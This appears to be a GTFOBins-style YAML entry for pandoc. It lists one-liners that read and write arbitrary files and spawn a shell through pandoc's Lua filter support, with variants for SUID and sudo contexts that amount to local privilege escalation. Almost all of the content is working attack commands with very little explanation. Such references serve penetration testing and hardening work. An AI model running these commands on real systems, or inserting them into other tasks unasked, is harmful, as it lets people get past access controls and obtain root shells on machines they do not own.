---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        pandoc -t plain "$LFILE"
  file-write:
    - code: |
        LFILE=file_to_write
        echo DATA | pandoc -t plain -o "$LFILE"
  shell:
    - description: Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' >$TF
        pandoc -L $TF /dev/null
  suid:
    - code: |
        LFILE=file_to_write
        echo DATA | ./pandoc -t plain -o "$LFILE"
  limited-suid:
    - description: Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' >$TF
        ./pandoc -L $TF /dev/null
  sudo:
    - description: Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' >$TF
        sudo pandoc -L $TF /dev/null
---
